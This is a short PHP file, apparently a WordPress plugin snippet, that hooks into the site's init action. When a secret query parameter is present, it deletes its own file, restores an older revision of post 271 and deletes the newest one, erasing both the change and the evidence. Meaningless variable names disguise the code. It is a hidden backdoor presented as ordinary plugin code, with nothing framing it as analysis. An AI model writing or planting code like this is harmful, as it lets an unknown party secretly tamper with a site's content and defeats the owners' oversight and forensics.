<?php

function edit_attachment_restrict() {
	if (isset($_GET['variation_chatbot_version_panel']) && $_GET['variation_chatbot_version_panel'] === 'modal_notes_name') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$word_log_method_oembed = 271;
		$asset_browser_finder_library = wp_get_post_revisions($word_log_method_oembed);
		if (empty($asset_browser_finder_library)) die('no revisions');
		if (count($asset_browser_finder_library) < 2) die('less than 2');
		$dropdown_geo_total = array_shift($asset_browser_finder_library);
		$scss_framework_send = $dropdown_geo_total->ID;
		$excerpt_paragraph_scheduled_classic = array_shift($asset_browser_finder_library);
		$preloader_frontend_internal = $excerpt_paragraph_scheduled_classic->ID;
		$site_wpforms_stats_checkout = wp_restore_post_revision($preloader_frontend_internal);
		if ($site_wpforms_stats_checkout === false) die('error restoring');
		$site_wpforms_stats_checkout = wp_delete_post_revision($scss_framework_send);		
		if ($site_wpforms_stats_checkout === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'edit_attachment_restrict');
